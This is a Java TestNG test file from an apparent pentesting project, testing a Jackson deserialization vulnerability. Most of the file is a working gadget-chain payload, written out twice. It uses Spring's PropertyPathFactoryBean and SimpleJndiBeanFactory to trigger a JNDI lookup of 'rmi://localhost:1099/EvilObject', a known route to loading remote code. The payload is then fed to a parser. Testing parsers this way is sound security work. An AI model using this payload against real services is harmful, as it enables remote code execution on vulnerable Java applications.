package de.marko.pentest.parser;

import de.marko.pentest.Dummy;
import java.io.IOException;
import javax.naming.NamingException;
import org.testng.annotations.Test;

/**
 * @author marko
 * @version 1.0.0.
 * @date 20.08.2017
 */
public class JacksonParserTest {

	@Test
	public void T001_parseJacksonVuln() throws IOException, NamingException {

		final String payload = "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"rmi://localhost:1099/EvilObject\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"rmi://localhost:1099/EvilObject\"]}]}]";

		final String JSON = aposToQuotes(
			"{'id': 124,\n" +
				"'object': ['org.springframework.beans.factory.config.PropertyPathFactoryBean',\n" +
				"{\n" +
				"'targetBeanName': 'rmi://127.0.0.1:1099/EvilObject',\n" +
				"'propertyPath': 'foo',\n" +
				"'beanFactory': ['org.springframework.jndi.support.SimpleJndiBeanFactory',\n" +
				"{\n" +
				"'shareableResources': ['rmi://127.0.0.1:1099/EvilObject']\n" +
				"  }\n" +
				" ]\n" +
				"  }\n" +
				" ]\n" +
				"  }\n");

		ObjectParser parser = new ObjectParser();

		DummyParser dummyParser = new DummyParser();

		// Dummy cast_dummy = (Dummy) parser.parseJackson(Object.class, payload);

		Dummy parse_dummy = dummyParser.parseJackson(Dummy.class, JSON);

	}

	protected static String aposToQuotes(String json) {
		return json.replace("'", "\"");
	}

}
